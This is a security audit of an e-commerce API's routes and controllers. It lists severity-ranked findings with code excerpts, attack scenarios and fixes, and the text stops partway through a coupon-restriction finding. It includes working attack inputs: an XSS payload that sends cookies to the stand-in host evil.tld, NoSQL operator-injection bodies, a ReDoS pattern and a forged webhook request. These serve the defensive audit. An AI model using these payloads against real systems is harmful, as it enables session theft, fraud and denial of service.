# SECURITY AUDIT — OZOBATH E-Commerce API

**Scope:** `apps/server` (Express + Mongoose + Razorpay + Shiprocket + Cloudinary)
**Method:** Static review of all routes, controllers, models, middleware and config, with targeted runtime probes to confirm or refute exploitability before reporting.
**Date:** 2026-08-03
**Commit base:** `f216276` (branch `mufadda-security-checklist`), plus the quantity-integrity patch applied in the preceding session.

---

## Executive summary

The codebase has clearly had at least one prior hardening pass, and the payment path in particular shows real security engineering: the Razorpay signature is verified with `timingSafeEqual`, the captured amount is reconciled against the gateway, the priced cart is frozen in a `PendingCheckout` snapshot, and a unique sparse index enforces order idempotency at the database level. Boot-time config validation rejects weak secrets. These are not cosmetic controls and they materially reduce the attack surface. Section "What is genuinely fine" lists them in full.

The problems are concentrated in three areas:

1. **Trust boundaries that are declared but not enforced.** The Shiprocket webhook accepts unauthenticated, unsigned input from the public internet and mutates order and shipment state. This is the single most serious finding.
2. **Authorization applied per-handler rather than systematically.** Ownership checks are present on most customer-scoped routes and genuinely correct where they exist — but they are hand-written at each call site, and one route was missed entirely (shipment tracking). Deny-by-default does not exist; each route opts in.
3. **No input validation layer at all.** Not one endpoint validates a request body against a schema. Thirty-one call sites pass `req.body` directly into a Mongoose write. The consequences range from stored XSS to admin-privilege mass assignment.

A fourth theme, less severe but pervasive: **no transactions anywhere**. Order creation, stock decrement, coupon claim and cart clear are four independent writes. A crash between any two leaves inconsistent state with no compensating action.

**Counts:** 3 Critical, 9 High, 12 Medium, 7 Low.

Two items I want to flag as *not* findings, because a reader would reasonably expect them:

- **NoSQL authentication bypass on `/auth/login` does not work.** Operator injection into the email selector succeeds, but `bcrypt.compare` throws on a non-string candidate, producing a 500 rather than a session. Verified at runtime. It is still reported (H-06) for the enumeration and DoS it does enable, but it is not an auth bypass and should not be triaged as one.
- **`axios` vulnerabilities do not apply to the server.** `npm audit` reports 20+ axios advisories, but `axios` is a hoisted client-side dependency; no server file requires it. Excluded from D-01.

---

## Findings table

| ID | Sev | Category | Finding | Location |
|---|---|---|---|---|
| C-01 | **Critical** | Auth / Integrity | Shiprocket webhook is unauthenticated and unsigned; anyone can mark orders delivered or cancelled | `shipping.controller.js:176` |
| C-02 | **Critical** | Business logic | Refund amount is uncapped — admin/compromised-admin can refund more than was captured | `payment.controller.js:381` |
| C-03 | **Critical** | Business logic | `updateOrderStatus` has no state machine and force-sets `paymentStatus='paid'` | `order.controller.js:220-230` |
| H-01 | High | Authorization | BOLA: `GET /shipping/track/:orderId` returns any customer's shipment and address | `shipping.controller.js:112` |
| H-02 | High | Injection | Stored XSS via review `comment`/`title` — no sanitisation, rendered in admin + storefront | `remaining.controller.js:50` |
| H-03 | High | Authorization | Mass assignment: 31 sinks pass raw `req.body` into Mongoose writes | 6 files (see detail) |
| H-04 | High | Business logic | No Razorpay webhook — payment state depends entirely on the browser calling `/confirm` | `payment.routes.js` |
| H-05 | High | Business logic | Orphaned `verifyPayment` marks any order paid from client-supplied `orderId` | `remaining.controller.js:713` |
| H-06 | High | Injection | NoSQL operator injection reaches query selectors (enumeration + DoS, not auth bypass) | `auth.controller.js:58` +6 |
| H-07 | High | Concurrency | No transactions: order, stock, coupon and cart are four independent writes | `payment.controller.js:248-300` |
| H-08 | High | API hardening | CORS trusts **any** `*.vercel.app` / `*.railway.app` origin with credentials | `app.js:38` |
| H-09 | High | Data protection | `GET /auth/me` returns the full user document including all addresses | `auth.controller.js:120` |
| M-01 | Medium | Auth/session | Refresh token stored plaintext, single-slot, no reuse detection | `auth.controller.js:99`, `User.js:36` |
| M-02 | Medium | Auth/session | No password reset flow despite model fields; no MFA; no lockout | `User.js:37-38` |
| M-03 | Medium | CSRF | `sameSite:'none'` refresh cookie with no CSRF token | `auth.controller.js:38-41` |
| M-04 | Medium | Business logic | `placeCodOrder` has no state check and decrements no stock | `payment.controller.js:411` |
| M-05 | Medium | Business logic | Coupon `applicableCategories`/`applicableProducts` are never enforced | `remaining.controller.js:219` |
| M-06 | Medium | Business logic | Review helpful-vote has no per-user dedupe — unbounded self-voting | `remaining.controller.js:141` |
| M-07 | Medium | File upload | SVG accepted on image upload; MIME-only validation, no magic bytes | `middleware/upload.js:10` |
| M-08 | Medium | API hardening | Unbounded `limit` on 8 endpoints; `/orders/export` dumps the whole table | `order.controller.js:255` +7 |
| M-09 | Medium | Rate limiting | No endpoint-specific limits on `/refresh`, payment, review, or public POSTs | `middleware/rateLimiter.js` |
| M-10 | Medium | Integrity | `orderNumber` generated by `countDocuments()+1` — races and collides | `Order.js:83-89` |
| M-11 | Medium | Logic bug | Duplicate `$or` key silently disables content scheduling window | `content.controller.js:17-26` |
| M-12 | Medium | Dependencies | `xlsx` has unfixed prototype-pollution + ReDoS; `multer` 1.x is EOL | `package.json` |
| L-01 | Low | Logic bug | Shipping controller reads `order.orderStatus`/`totalAmount` — fields that don't exist | `shipping.controller.js:19,57,80` |
| L-02 | Low | Logic bug | Bulk upload rejects .xlsx because the image MIME filter is applied | `product.routes.js:16` |
| L-03 | Low | Auth | Dead `accessToken` cookie branch — never set anywhere | `middleware/auth.js:11` |
| L-04 | Low | Config | `JWT_ACCESS_EXPIRES_IN` defaults to `1d`; `.env.example` claims `15m` | `config/env.js:135` |
| L-05 | Low | Info leak | Newsletter unsubscribe lets anyone unsubscribe any email; token branch is dead | `remaining.controller.js:435` |
| L-06 | Low | Info leak | `/api/health` discloses `NODE_ENV` | `app.js:67` |
| L-07 | Low | Audit | Activity log covers products and order status only; no money or permission events | `activityLog.controller.js:10` |

---

# Detail

## C-01 — Shiprocket webhook is unauthenticated and unsigned

**Severity: Critical** · Category 1 (auth), 4 (business logic), 8 (integrity)

**Location:** [`shipping.controller.js:176-223`](apps/server/src/controllers/shipping.controller.js#L176-L223), routed at [`shipping.routes.js:14`](apps/server/src/routes/shipping.routes.js#L14)

```js
router.post('/webhook', handleWebhook);          // no auth, no signature middleware

const handleWebhook = asyncHandler(async (req, res) => {
  const { awb, current_status, current_timestamp, shipment_id, etd } = req.body;

  const shipment = await Shipment.findOne({
    $or: [{ awbCode: awb }, { shipmentId: String(shipment_id) }],
  });
  ...
  shipment.status = mappedStatus;
  await shipment.save();

  if (orderStatusMap[mappedStatus]) {
    await Order.findByIdAndUpdate(shipment.order, { orderStatus: orderStatusMap[mappedStatus] });
  }
```

Verified by grep: there is **no** signature check, no shared secret, no IP allowlist, and no `SHIPROCKET_WEBHOOK_SECRET` in `env.js` or `.env.example`. The endpoint is reachable by anyone on the internet.

**Attack scenario.** An attacker orders a product, receives the AWB number in their own tracking email, then posts directly to the public endpoint:

```
POST /api/v1/shipping/webhook
{"awb":"<their own AWB>","current_status":"7"}
```

`'7'` maps to `delivered`, which sets `shipment.deliveredAt` and drives the order to `delivered`. For a COD order this is the trigger that [`order.controller.js:226-228`](apps/server/src/controllers/order.controller.js#L226-L228) uses to auto-mark `paymentStatus='paid'` — so the attacker marks their own unpaid COD order as paid and delivered without any cash changing hands. There is no `awb` → order-ownership check, so an attacker who can guess or enumerate AWB codes (they are sequential per courier) can do this to **arbitrary orders**, including marking other customers' in-transit orders `cancelled` (status `'8'`), which is a denial-of-service against fulfilment.

Note the write is partially inert today because of L-01 (`orderStatus` is not a field on the Order schema, so the `Order.findByIdAndUpdate` writes a stray field rather than changing `status`). That is an accident, not a mitigation — the `Shipment` mutation lands fully, and fixing L-01 without fixing this would immediately make the order takeover live.

**Fix.** Verify the Shiprocket webhook signature (`x-api-key` header against a `SHIPROCKET_WEBHOOK_SECRET` env var, compared with `crypto.timingSafeEqual`) before any database access; reject with 401 otherwise. Add the secret to `env.js` `REQUIRED_VARS`. Additionally: dedupe on a webhook event id to make replays idempotent, and validate that the AWB belongs to the shipment being mutated.

---

## C-02 — Refund amount is uncapped against the captured amount

**Severity: Critical** · Category 4 (business logic)

**Location:** [`payment.controller.js:372-390`](apps/server/src/controllers/payment.controller.js#L372-L390)

```js
const initiateRefund = asyncHandler(async (req, res) => {
    const { amount, reason } = req.body;
    const order = await Order.findById(req.params.orderId);

    if (!order) throw new ApiError(404, 'Order not found');
    if (!order.razorpayPaymentId) throw new ApiError(400, 'No payment found for this order');
    if (order.paymentStatus === 'refunded') throw new ApiError(400, 'Order already refunded');

    const refundAmount = amount ? Math.round(amount * 100) : Math.round(order.total * 100);

    const refund = await rzp.payments.refund(order.razorpayPaymentId, {
        amount: refundAmount,        // ← never compared to order.total or to what Razorpay captured
```

`amount` comes straight from the request body. There is no upper bound, no comparison against `order.total`, no check of the actual captured amount via `rzp.payments.fetch`, and no accumulation against prior partial refunds. A negative or fractional `amount` is equally unvalidated.

**Attack scenario.** The route is `roleGuard('admin','superadmin')`, so this requires an admin account — but "admin" here includes every account created via `POST /admin/users`, and admin credentials are exactly what phishing and credential-stuffing target. Given any admin session, `POST /api/v1/payment/<orderId>/refund {"amount": 500000}` on a ₹2,000 order attempts a ₹5,00,000 refund against the merchant's Razorpay balance. Razorpay will reject a refund exceeding the captured payment, so the *loss* is bounded by the gateway rather than by this code — but nothing here prevents the attempt, nothing logs it (see L-07), and **partial refunds are not tracked**, so `amount: 2000` submitted ten times is ten separate ₹2,000 refund requests against a single ₹2,000 capture. Razorpay caps the total refunded per payment, but the order is marked `refunded` on the first call and the remaining nine produce unlogged, unreconciled gateway activity.

The compounding issue is that success is assumed: `order.paymentStatus = 'refunded'` is set unconditionally after the API call, with no inspection of `refund.status`. A refund that Razorpay marks `pending` or later fails leaves the order permanently marked refunded.

**Fix.** Fetch the payment from Razorpay, compute `refundable = amount_paid − already_refunded`, and reject any `amount` that is not a positive integer number of paise ≤ `refundable`. Persist a refund ledger (refund id, amount, status) on the order rather than a single boolean-ish `paymentStatus`. Only transition to `refunded` when the refunded total equals the captured total. Write an audit log entry (L-07).

---

## C-03 — Order status has no state machine and force-sets payment to paid

**Severity: Critical** · Category 4 (business logic), 10 (audit)

**Location:** [`order.controller.js:214-237`](apps/server/src/controllers/order.controller.js#L214-L237)

```js
const { status, note, trackingNumber, trackingUrl } = req.body;

const order = await Order.findById(req.params.id);
if (!order) throw new ApiError(404, 'Order not found.');

order.status = status;                                    // ← any value, any current state
...
if (status === 'delivered') {
    if (order.paymentMethod === 'cod' && order.paymentStatus !== 'paid') {
      order.paymentStatus = 'paid';                       // ← money state from a status field
    }
}
if (status === 'confirmed') order.paymentStatus = 'paid'; // ← unconditional
```

There is no validation that `status` is a legal transition from `order.status`, and no check that a payment exists. The enum on the model constrains the *value* but not the *sequence*.

**Attack scenario.** Any admin (or anything that reaches an admin session — see C-02 on why that is not a high bar) can:

- `PUT /orders/<id>/status {"status":"confirmed"}` on an unpaid `pending` order → `paymentStatus` becomes `paid` with **no payment of any kind**. The order enters fulfilment. This is the shortest path from "admin account" to "free goods" in the codebase.
- `PUT /orders/<id>/status {"status":"delivered"}` on a cancelled-and-refunded order → order returns to `delivered`, and for COD flips `paymentStatus` back to `paid`, erasing the refund from the order's apparent state.
- Ship an unpaid order: `pending` → `shipped` directly, skipping `confirmed` entirely.

Because `statusHistory` is append-only, the history will *record* these transitions — but nothing prevents them, no alert fires, and the activity log (L-07) captures the status change without capturing the `paymentStatus` side effect.

The same absence of a state machine means C-01's webhook and this handler can drive the same order in contradictory directions concurrently.

**Fix.** Define an explicit transition table (`pending → confirmed → processing → shipped → delivered`, with `cancelled` reachable only from pre-shipped states and `returned` only from `delivered`) and reject illegal transitions with 400. Decouple `paymentStatus` from `status`: `confirmed` must require an existing verified payment rather than creating one, and COD-on-delivery should be an explicit "record cash collected" action with its own audit entry, not a side effect of a status string.

---

## H-01 — BOLA on shipment tracking

**Severity: High** · Category 2 (authorization)

**Location:** [`shipping.controller.js:111-127`](apps/server/src/controllers/shipping.controller.js#L111-L127), routed at [`shipping.routes.js:17`](apps/server/src/routes/shipping.routes.js#L17)

```js
router.get('/track/:orderId', auth, trackShipment);   // auth only — no ownership

const trackShipment = asyncHandler(async (req, res) => {
  const shipment = await Shipment.findOne({ order: req.params.orderId });   // ← no user filter
  if (!shipment) throw new ApiError(404, 'Shipment not found');
  ...
  sendResponse(res, 200, { shipment, tracking: trackingData?.tracking_data || null }, ...);
});
```

Every other customer-scoped route in the codebase correctly scopes its query — `getMyOrderById` uses `{ _id: req.params.id, user: req.user._id }`, notifications use `{ _id, user }`, cart is always `{ user: req.user._id }`. This handler is the one that was missed, which is exactly the failure mode you get without a central guard.

**Attack scenario.** Any authenticated customer — registration is open and unverified via `POST /auth/register` — iterates order ObjectIds against `GET /api/v1/shipping/track/<id>`. Each hit returns the full `Shipment` document plus live Shiprocket tracking data, which includes the **delivery address and recipient details** of another customer. ObjectIds are not sequential but they are time-ordered and partially predictable (4-byte timestamp + 5-byte random + 3-byte counter); more practically, order ids leak through other surfaces (admin notification links, CSV exports, referrer headers), and a single valid id is enough to confirm the vulnerability and harvest one victim's PII.

**Fix.** Scope the lookup to the requesting user: resolve the order first with `{ _id: req.params.orderId, user: req.user._id }`, 404 if absent, then find the shipment by that order. Longer term this is the case for the central ownership guard proposed in "Systemic recommendations".

---

## H-02 — Stored XSS via review content

**Severity: High** · Category 3 (injection)

**Location:** [`remaining.controller.js:36-52`](apps/server/src/controllers/remaining.controller.js#L36-L52)

```js
const { product, rating, title, comment, images } = req.body;
...
const review = await Review.create({
    product, user: req.user._id, rating, title, comment, images, isVerifiedPurchase,
});
```

`comment` and `title` are persisted verbatim. [`Review.js`](apps/server/src/models/Review.js) applies `trim` to `title` and nothing to `comment` — no length cap, no HTML stripping, no sanitiser dependency anywhere in `package.json`. `images` is an unvalidated array of arbitrary objects, so `images[].url` accepts `javascript:` and `data:` URIs.

**Attack scenario.** An attacker registers, posts a review containing `<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">`. The review lands with `isApproved: false` — but the **admin panel renders unapproved reviews for moderation** (`GET /reviews/admin/all` → `ReviewsView.vue`). The payload therefore executes in an admin's browser before anyone decides whether to approve it. From there: the admin's access token is in JS-reachable storage (the SPA holds `accessToken` in the Pinia store, not an httpOnly cookie), so the attacker gets an admin session, which chains directly into C-02 and C-03.

Rating is also unvalidated at the controller — the model's `min:1, max:5` catches out-of-range, but a non-numeric rating produces a 500 rather than a 400.

**Fix.** Sanitise `comment`/`title` server-side on write (strip HTML rather than escape-on-render, since two different SPAs consume this), enforce a length cap, validate `rating` as an integer 1–5 at the controller, and whitelist `images[].url` to `https://res.cloudinary.com/<cloud>/...`. Server-side sanitisation is the right layer here precisely because the admin panel is a second, independently-written consumer.

---

## H-03 — Mass assignment: 31 raw `req.body` sinks

**Severity: High** · Category 2 (authorization), 5 (API hardening)

**Locations** (31 sinks across 6 files, verified by grep):
[`product.controller.js:90,103`](apps/server/src/controllers/product.controller.js#L90) · [`content.controller.js:50,58`](apps/server/src/controllers/content.controller.js#L50) · [`banner.controller.js:32,37`](apps/server/src/controllers/banner.controller.js#L32) · [`category.controller.js`](apps/server/src/controllers/category.controller.js) · [`reel.routes.js:32,38`](apps/server/src/routes/reel.routes.js#L32) · and 20 in [`remaining.controller.js`](apps/server/src/controllers/remaining.controller.js) (blog, coupon, FAQ, testimonial, B2B, service request, video slot, site visit, experience centre, partner).

Representative:

```js
const createCoupon = asyncHandler(async (req, res) => {
  const coupon = await Coupon.create(req.body);          // every field client-controlled
});

const updateProduct = asyncHandler(async (req, res) => {
  const product = await Product.findByIdAndUpdate(req.params.id, req.body, {...});
});
```

**Attack scenario.** Two distinct classes:

*Public, unauthenticated.* `POST /enquiries/b2b` and `POST /service-requests` are open and do `Model.create(req.body)`. An attacker sets any schema field — including `status: 'resolved'` to bury a request, or fields that feed admin dashboards. More importantly they can write **unbounded documents**: with `express.json({limit:'10mb'})` and no per-field limits, each request can store ~10MB. A few thousand requests fill the database. There is no CAPTCHA and no endpoint-specific rate limit (M-09).

*Admin-scoped.* `updateCoupon` accepts `usedCount`, `usedBy`, `perUserLimit`, `usageLimit` — so a compromised admin resets coupon exhaustion silently. `updateProduct` accepts `price`, `stock`, `salesCount`, `avgRating`, `reviewCount` — the derived-integrity fields that the review and order paths maintain. `createBlog`/`updateBlog` accept `author`, allowing attribution forgery.

The one place mass assignment would be catastrophic — user role escalation — is **correctly guarded**: `register` hardcodes `role:'customer'`, `createAdminUser` rejects anything but `'admin'`, and `updateProfile` explicitly destructures `{name, phone, avatar}`. Credit where due; that is the pattern the other 31 sites should follow.

**Fix.** Per-resource allowlists at each write. This is the primary driver for the DTO layer in Phase 3, but the public endpoints (`/enquiries/b2b`, `/service-requests`, `/bookings/*`) should be allowlisted immediately regardless — they are unauthenticated.

---

## H-04 — No Razorpay webhook: payment state depends on the browser

**Severity: High** · Category 4 (business logic)

**Location:** [`payment.routes.js`](apps/server/src/routes/payment.routes.js) — no webhook route exists. Order creation happens only in [`confirmAndCreateOrder`](apps/server/src/controllers/payment.controller.js#L113), called by the client after the Razorpay modal succeeds.

The `/confirm` handler itself is well built — signature verified, amount reconciled against `rzp.orders.fetch`, idempotent via unique index. The gap is that **nothing calls it if the browser doesn't**.

**Attack scenario.** This is less "attacker exploits" and more "money is lost by default", though it is attacker-triggerable. A customer pays successfully; before the JS handler fires, they close the tab, lose connectivity, or the request fails. Razorpay has captured the money. No `Order` exists. The `PendingCheckout` snapshot TTLs away after 24h. The customer has been charged with no order, no notification, and no record beyond the Razorpay dashboard — reconciliation is manual. An attacker who wants to grief the merchant can deliberately abandon at that moment repeatedly, generating captured-but-unreconciled payments that must each be investigated and refunded by hand.

The code anticipates this — [`payment.controller.js:148-150`](apps/server/src/controllers/payment.controller.js#L148-L150) comments "*or a future webhook*" — so this is known-incomplete rather than unrecognised.

**Fix.** Add `POST /api/v1/payment/webhook` verifying `x-razorpay-signature` against `RAZORPAY_WEBHOOK_SECRET`, handling `payment.captured` by running the same snapshot→order logic. The existing unique index on `razorpayOrderId` already makes the browser path and webhook path safely idempotent against each other, so this is additive rather than a rewrite. Also add a reconciliation job comparing captured Razorpay payments against orders.

---

## H-05 — Orphaned `verifyPayment` marks arbitrary orders paid

**Severity: High** (latent) · Category 4 (business logic)

**Location:** [`remaining.controller.js:694-748`](apps/server/src/controllers/remaining.controller.js#L694-L748)

```js
const createRazorpayOrder = asyncHandler(async (req, res) => {
  const { amount, orderId } = req.body;                    // ← client-supplied amount
  const options = { amount: Math.round(amount * 100), currency: 'INR', ... };

const verifyPayment = asyncHandler(async (req, res) => {
  const { razorpay_order_id, razorpay_payment_id, razorpay_signature, orderId } = req.body;
  ...
  if (expectedSign !== razorpay_signature) throw new ApiError(400, ...);   // non-constant-time
  if (orderId) {
    const order = await Order.findByIdAndUpdate(orderId, {
      paymentStatus: 'paid', status: 'confirmed', ...                      // ← ANY order id
```

**Verified not routed.** Grep of `routes/` confirms `/payment/create-order` resolves to `payment.controller.js`, not this. Both functions are exported and dead.

**Attack scenario (if wired).** `verifyPayment` has no ownership check on `orderId` and no link between the verified payment and the order being marked paid. An attacker pays ₹1 for their own order, then replays the same valid signature triple with `orderId` set to a ₹5,00,000 order — theirs or anyone's — and that order becomes `paid`/`confirmed`. `createRazorpayOrder` separately takes the amount from the client, so the attacker sets their own price.

I am reporting this as High rather than Critical because it is unreachable today. It is included because dead code with this shape is a trap: it is exported alongside 40 live functions in the same module, and the next developer wiring up a payment route may import the wrong one — the names are near-identical to the correct implementations.

**Fix.** Delete both functions and their exports. If any client still references the old route shape, confirm before removal.

---

## H-06 — NoSQL operator injection into query selectors

**Severity: High** · Category 3 (injection)

**Locations:** [`auth.controller.js:58`](apps/server/src/controllers/auth.controller.js#L58), [`:143`](apps/server/src/controllers/auth.controller.js#L143) · [`remaining.controller.js:439`](apps/server/src/controllers/remaining.controller.js#L439) · [`product.controller.js:26,124`](apps/server/src/controllers/product.controller.js#L26) · [`order.controller.js:192`](apps/server/src/controllers/order.controller.js#L192) · [`activityLog.controller.js:32`](apps/server/src/controllers/activityLog.controller.js#L32)

Runtime-verified facts:
- Express query parser is `extended` → `?status[$ne]=x` parses to `{status:{$ne:'x'}}`.
- `express.json` passes body objects through untouched → `{"email":{"$ne":null}}` arrives as a real object.
- Mongoose accepts `{email:{$ne:null}}` and `{email:{$regex:'.*'}}` as filters without complaint.

**What does *not* work:** the classic login bypass. `POST /auth/login {"email":{"$ne":null},"password":{"$ne":null}}` finds a user, but `bcrypt.compare` throws `Illegal arguments: object, string` — a 500, not a session. Verified directly. **This is not an authentication bypass.**

**What does work:**

*User enumeration and account probing.* `{"email":{"$regex":"^admin"}}` with a string password returns 401 "Invalid email or password" when a match exists (bcrypt runs and fails) versus the identical 401 when no user matches — timing-distinguishable, since the matched case performs a full bcrypt cost-12 comparison (~250ms) and the unmatched case returns immediately. That is a reliable oracle for enumerating admin email prefixes character by character.

*Unauthenticated mass unsubscribe.* [`remaining.controller.js:439`](apps/server/src/controllers/remaining.controller.js#L439): `POST /newsletter/unsubscribe {"email":{"$ne":null}}` → `findOneAndUpdate({email:{$ne:null}}, {isActive:false})` deactivates a subscriber the attacker does not own. No auth, no rate limit beyond the global bucket.

*ReDoS.* `search`/`action` flow into `$regex` unescaped. A crafted pattern like `(a+)+$` against a large collection consumes CPU in the MongoDB server. `activityLog`'s `action` filter is admin-only, but `/products/admin/all` and `/orders` search are reachable by any admin, and `$text` search on `/products` is public.

*Filter subversion.* `?status[$ne]=cancelled` on `/orders` or `?category[$ne]=null` on `/products` alters result sets in ways the handlers don't anticipate.

**Fix.** Reject request bodies and query values containing keys starting with `$` or containing `.` at the boundary (an `express-mongo-sanitize`-equivalent, applied globally in `app.js`), and independently coerce `email`, `search`, `status`, `category` to `String` before use. Escape user input before it reaches `$regex`, or replace regex search with `$text`.

---

## H-07 — No transactions across order, stock, coupon and cart

**Severity: High** · Category 8 (concurrency & integrity)

**Location:** [`payment.controller.js:248-300`](apps/server/src/controllers/payment.controller.js#L248-L300), [`order.controller.js:38-84`](apps/server/src/controllers/order.controller.js#L38-L84)

The confirm path performs, in sequence and independently: claim coupon (`:209`), create order (`:248`), mark snapshot consumed (`:287`), decrement stock in a loop (`:293`), clear cart (`:300`). Grep confirms `startSession` / `withTransaction` appear nowhere in the codebase.

**Attack scenario / failure mode.** A crash, a Mongo failover, or a process restart between any two steps leaves permanently inconsistent state with no compensating action:

- Between coupon claim and order create → coupon burned, no order. The customer paid, has no order, and their single-use coupon is gone.
- Between order create and stock decrement → order exists, inventory never decremented. Oversell, and the discrepancy is invisible until a stock count.
- Between stock decrement and cart clear → the customer's cart still holds the items they just bought; a second checkout double-orders.

An attacker can raise the probability of hitting these windows by driving concurrent load, though the more realistic trigger is ordinary infrastructure churn on Railway.

Related, and worth noting as the design point rather than a separate finding: the stock decrement now correctly refuses to oversell (per the quantity patch), but because there is no **reservation** at quote time, two customers can both be quoted the last unit; the second is charged and then discovers the shortfall post-payment. The code deliberately does not fail that order — the customer has already paid — but it does mean oversell is now *detected and logged* rather than *prevented*.

**Fix.** Wrap the confirm and create-order paths in a `mongoose.startSession()` transaction (requires a replica set — MongoDB Atlas provides this by default). For the reservation problem, decrement stock at quote time into a reserved counter with a TTL, released on abandonment.

---

## H-08 — CORS trusts any `*.vercel.app` / `*.railway.app` origin with credentials

**Severity: High** · Category 5 (API hardening)

**Location:** [`app.js:32-46`](apps/server/src/app.js#L32-L46)

```js
if (allowed.includes(origin) || origin.endsWith('.vercel.app') || origin.endsWith('.railway.app')) {
  return callback(null, true);
}
...
credentials: true,
```

`*.vercel.app` and `*.railway.app` are **shared public deployment domains**. Anyone can deploy a site to `evil-attacker.vercel.app` in minutes, free, with no verification.

**Attack scenario.** An attacker deploys a page to `attacker.vercel.app` and lures a logged-in customer or admin to it. Because `credentials: true` and the refresh cookie is `sameSite:'none'` (M-03), the browser attaches the refresh cookie to cross-origin requests. The attacker's page calls `POST /api/v1/auth/refresh` — no auth middleware, no CSRF token — receives a **fresh access token in the JSON response body**, which their JS reads because CORS permitted the origin. From there they hold a valid access token for the victim's account and can drive any authenticated endpoint. If the victim is an admin, this chains to C-02 and C-03.

Note also `if (!origin) return callback(null, true)` at `:36` — requests with no Origin header are always allowed. That is a common allowance for mobile/curl and is not itself the issue, since browsers always send Origin for cross-origin requests.

**Fix.** Replace the suffix matching with an explicit allowlist from env. If preview deployments must work, match a specific project pattern (`/^https:\/\/ozobath-[a-z0-9-]+\.vercel\.app$/`) rather than the whole shared domain, and disable it in production.

---

## H-09 — `GET /auth/me` returns the full user document

**Severity: High** · Category 5 (excessive data exposure), 7 (PII)

**Location:** [`auth.controller.js:119-122`](apps/server/src/controllers/auth.controller.js#L119-L122)

```js
const getProfile = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  sendResponse(res, 200, user, 'Profile fetched');     // whole document
});
```

`userSchema.methods.toJSON` ([`User.js:57-64`](apps/server/src/models/User.js#L57)) strips `password`, `refreshToken`, `passwordResetToken`, `passwordResetExpires` — so **credentials are not leaked**. That mitigation is real and correctly implemented.

What is returned is the complete `addresses` array: every saved address with `fullName`, `phone`, `line1`, `line2`, `city`, `state`, `pincode`. Also `role`, `isActive`, `emailVerified`, `createdBy`, timestamps.

**Attack scenario.** This is the amplifier for any XSS or token leak rather than a standalone breach. Given H-02 (stored XSS) or H-08 (CORS token theft), a single request to `/auth/me` yields the victim's complete physical-address history — the highest-value PII the system holds — where a scoped response would have yielded a name and email. It also means every client-side cache, browser devtools session, and error-reporting payload that captures an API response now contains full postal addresses.

`getProfile` is mounted twice (`/auth/me` and `/users/me`), both affected.

**Fix.** Return an explicit projection: `_id, name, email, phone, avatar, role`. Serve addresses from a dedicated `GET /auth/addresses` endpoint when the checkout flow actually needs them. This is the concrete case for the response-serialization layer in Phase 3.

---

## M-01 — Refresh token: plaintext, single-slot, no reuse detection

**Severity: Medium** · Category 1

[`User.js:36`](apps/server/src/models/User.js#L36) stores `refreshToken` as a plain string. [`auth.controller.js:92`](apps/server/src/controllers/auth.controller.js#L92) compares it with `!==` (non-constant-time), and `:99` overwrites it on every refresh.

Three consequences. **(a)** A database read — backup leak, injection, or an insider — yields directly usable refresh tokens; they should be stored hashed like passwords. **(b)** Single-slot storage means logging in on a phone silently logs out the desktop, and there is no way to enumerate or revoke individual sessions. **(c)** Rotation happens but **reuse is not detected**: if an attacker steals a refresh token and uses it, the legitimate user's next refresh simply fails with 401 and they re-login — the theft is indistinguishable from an expired session, and the attacker retains their freshly-issued token. Proper rotation invalidates the entire token family on reuse.

**Fix.** Store `sha256(token)`, compare with `timingSafeEqual`, keep an array of active sessions with device metadata, and invalidate the family on reuse detection.

---

## M-02 — No password reset, no MFA, no account lockout

**Severity: Medium** · Category 1

[`User.js:37-38`](apps/server/src/models/User.js#L37) declares `passwordResetToken` and `passwordResetExpires`. Grep confirms **no code reads or writes either field** and no reset/forgot route exists.

Users who forget their password have no recovery path — operationally this means manual admin intervention, and `updateAdminUser` cannot set passwords either, so recovery requires direct database access. There is also no MFA for admin accounts and no account lockout: `authLimiter` allows 50 attempts per 2 minutes per IP, which is 36,000/day from a single IP and unlimited from a botnet, against unlimited-lifetime passwords with no breach checking.

`quick-login` ([`:136`](apps/server/src/controllers/auth.controller.js#L136)) additionally **auto-creates an account** on unknown email, so failed logins there are indistinguishable from registrations and the endpoint doubles as unbounded account creation.

**Fix.** Implement reset with a hashed, single-use, short-TTL token delivered by email. Add per-account failed-attempt lockout with exponential backoff. Add TOTP for `admin`/`superadmin`. Email verification before first order.

---

## M-03 — `sameSite:'none'` cookie with no CSRF defence

**Severity: Medium** · Category 5

[`auth.controller.js:38-41`](apps/server/src/controllers/auth.controller.js#L38-L41), repeated at `:72` and `:165`:

```js
const options = { httpOnly: true, secure: true, sameSite: 'none', maxAge: 7*24*60*60*1000 };
res.cookie('refreshToken', refreshToken, options);
```

`httpOnly` and `secure` are correct. `sameSite:'none'` is required for the cross-origin SPA setup and is a legitimate choice — but it explicitly opts out of the browser's default CSRF protection, and nothing replaces it. There is no CSRF token, no Origin check on state-changing routes, and `POST /auth/refresh` requires no auth header.

This is the mechanism H-08 exploits. Even with CORS fixed, any future origin-validation slip re-opens it.

Separately, `secure: true` is unconditional, so the cookie is silently dropped over plain HTTP — local development against `http://localhost` cannot maintain a session.

**Fix.** Add a CSRF token (double-submit cookie) for cookie-authenticated state-changing requests, or require the `Authorization` header for `/refresh` so the cookie alone is insufficient. Make `secure` conditional on `NODE_ENV === 'production'`.

---

## M-04 — `placeCodOrder` has no state check and decrements no stock

**Severity: Medium** · Category 4

[`payment.controller.js:411-436`](apps/server/src/controllers/payment.controller.js#L411-L436)

```js
const order = await Order.findOne({ _id: orderId, user: req.user._id });   // ownership: correct
if (!order) throw new ApiError(404, 'Order not found');

order.paymentMethod = 'cod';
order.paymentStatus = 'pending';
order.status = 'confirmed';
```

Ownership is correctly enforced. But there is no check of the order's current state, so a customer can `POST /payment/cod {orderId}` against **any of their own orders in any state** — including one already paid by Razorpay. That flips a paid order to `paymentMethod:'cod'`, `paymentStatus:'pending'`, wiping the record that it was already paid. Combined with C-03's COD-on-delivery auto-paid, the order is later marked paid again on delivery — the merchant ships goods believing cash is owed and collected, when the customer already paid by card and may dispute.

It also decrements no stock, unlike both other order paths. A COD order reserves nothing.

**Fix.** Reject unless `order.status === 'pending' && order.paymentStatus === 'pending' && !order.razorpayPaymentId`. Decrement stock via the shared helper.

---

## M-05 — Coupon product/category restrictions are never enforced

**Severity: Medium** · Category 4

[`Coupon.js:24-25`](apps/server/src/models/Coupon.js#L24) declares `applicableCategories` and `applicableProducts`. Grep confirms neither is read anywhere — not in `validateCoupon`, not in `autoApplyCoupon`, not in `calculateDiscount` ([`calculateTotals.js:53`](apps/server/src/utils/calculateTotals.js#L53), which takes only `coupon` and `subtotal`).

